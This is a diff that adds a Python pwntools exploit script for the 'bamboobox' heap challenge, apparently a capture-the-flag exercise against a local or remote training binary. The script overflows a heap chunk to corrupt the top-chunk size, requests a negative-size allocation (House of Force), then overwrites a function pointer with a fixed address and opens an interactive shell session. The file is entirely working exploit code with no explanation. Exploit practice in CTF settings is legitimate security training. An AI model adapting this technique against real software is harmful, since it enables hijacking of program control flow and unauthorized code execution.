@@ -1,0 +1,70 @@
+from pwn import *
+
+context(arch = 'amd64', os = 'linux', log_level = 'debug')
+libc = ELF('./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
+ld = ELF('./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so')
+elf = ELF("./bamboobox_patch")
+sh = process(elf.path)
+#sh = process(argv = [ld.path, elf.path], env = {"LD_PRELOAD" : libc.path})
+#sh = remote('node4.buuoj.cn', 29396)
+#gdb.attach(sh)
+
+f = lambda size: str.encode(str(size))
+
+atoi_got = elf.got['atoi']
+free_got = elf.got['free']
+
+def add(size, content):
+    sh.recvuntil(b'Your choice:')
+    sh.sendline('2')
+    sh.recvuntil(b'Please enter the length of item name:')
+    sh.sendline(f(size))
+    sh.recvuntil(b'Please enter the name of item:')
+    sh.sendline(content)
+
+def edit(idx, size, content):
+    sh.recvuntil(b'Your choice:')
+    sh.sendline('3')
+    sh.sendlineafter(b'Please enter the index of item:', f(idx))
+    sh.recvuntil(b'Please enter the length of item name:')
+    sh.sendline(str.encode(str(size)))
+    sh.recvuntil(b'Please enter the new name of the item:')
+    sh.sendline(content)
+    pass
+
+def show():
+    sh.recvuntil(b'Your choice:')
+    sh.sendline('1')
+    pass
+
+def delete(idx):
+    sh.recvuntil(b'Your choice:')
+    sh.sendline('4')
+    sh.recvuntil(b'Please enter the index of item:')
+    sh.sendline(str.encode(str(idx)))
+    pass
+
+def exit():
+    sh.recvuntil(b'Your choice:')
+    sh.sendline('5')
+    pass
+
+
+add(0x30,b'aaaa')
+#gdb.attach(sh)
+payload = b'a' * 0x30 + p64(0) + p64(0xffffffffffffffff)
+edit(0,0x41,payload)
+add(-119,b'cccc')
+add(0x10, p64(0x400D49) * 2)
+show()
+sh.interactive()
+exit()
+con = sh.recvall()
+print(con)
+sh.close()
+
+
+
+
+
+
